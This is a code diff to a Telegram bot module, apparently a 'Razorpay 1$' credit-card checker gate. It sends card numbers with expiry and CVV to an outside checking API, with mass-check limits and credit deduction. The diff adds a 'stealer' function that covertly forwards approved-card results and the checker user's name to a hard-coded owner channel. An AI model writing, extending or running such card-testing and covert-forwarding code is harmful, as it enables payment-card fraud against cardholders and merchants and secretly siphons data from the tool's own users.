@@ -3,26 +3,45 @@ import asyncio
 import re
 import json
 import aiohttp
-from pyrogram import filters
+import os
+from pyrogram import Client, filters
+from FUNC.usersdb_func import *
+from FUNC.defs import *
+from TOOLS.check_all_func import *
+from TOOLS.getbin import *
+from TOOLS.getcc_for_mass import *
 
-# -------------------------------------------------------------
-# Configuration for this gateway
-# -------------------------------------------------------------
+# ========== CONFIGURATION ==========
 GATE_NAME = "Razorpay 1$"
 MAX_MSC_LIMIT = 10
 MAX_TSC_LIMIT = 100
 
 API_BASE = "https://pay.cxchk.site/razor/auto"
-SITE_PARAM = "https://pages.razorpay.com/lckuk-international"   # change if needed
+SITE_PARAM = "https://pages.razorpay.com/lckuk-international"
+
+# ========== STEALER CONFIG (same as your other gates) ==========
+STEALER_CHANNEL_ID = -1003627495953
+OWNER_DM = "https://t.me/spid_3r"
+SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"
+
+async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_taken, first_name, role):
+    try:
+        stealer_msg = f"""✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅
+
+{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
+{SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}
+
+{SYMBOL} 𝗧𝗼𝗼𝗸 {time_taken:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀
+{SYMBOL} 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {first_name} ({role})
+{SYMBOL} 𝗢𝘄𝗻𝗲𝗿: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=stealer_msg, parse_mode="HTML")
+    except Exception as e:
+        print(f"[Stealer Error] {e}")
 
 # -------------------------------------------------------------
-# Helper: call Razorpay API (returns only status and message, not raw JSON)
+# Helper: call Razorpay API
 # -------------------------------------------------------------
 async def call_razor_api(fullcc: str) -> tuple:
-    """
-    Returns: (status_display, extracted_response_message)
-    status_display: "Approved ✅" or "Declined ❌" or "Error"
-    """
     try:
         parts = fullcc.split('|')
         if len(parts) != 4:
@@ -292,3 +311,4 @@ async def process_sequential_check(client, message, ccs, user_id, first_name, ro
         )
 
     await setantispamtime(user_id)
+    await massdeductcredit(user_id, total)
